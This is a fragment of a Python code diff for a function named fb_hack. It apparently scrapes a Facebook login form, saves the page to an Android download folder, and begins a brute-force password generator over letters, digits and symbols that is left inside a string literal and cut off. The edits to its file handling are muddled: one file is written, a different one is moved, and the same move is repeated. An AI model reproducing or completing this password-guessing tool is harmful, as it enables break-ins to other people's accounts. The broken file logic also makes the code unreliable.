@@ -52,7 +52,7 @@ def fb_hack(email, codex, respect):
   #response1 = browser.response()
   #soup = BeautifulSoup(response1, 'html.parser')
   #mobile = soup.find(string=re.compile("mobile"))
-  forms = list(br.forms())
+  forms = list(browser.forms())
   form = forms[0]
   print(form)
   #browser.form['email'] = email
@@ -63,9 +63,11 @@ def fb_hack(email, codex, respect):
     file.write(str(soup))
   with open("output1.txt", "w") as file:
     file.write(str(soup))
-  source_file = "output1.txt" 
+  source_file = "output1.html" 
   destination_folder = "/sdcard/download/output1.txt" 
-  
+  shutil.move(source_file, destination_folder)
+  source_file = "output1.html" 
+  destination_folder = "/sdcard/download/output1.html" 
   shutil.move(source_file, destination_folder)
   """counter = 0
   for combination in itertools.product(["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","!","#","$","%","^","&","*"], repeat=int(respect)):
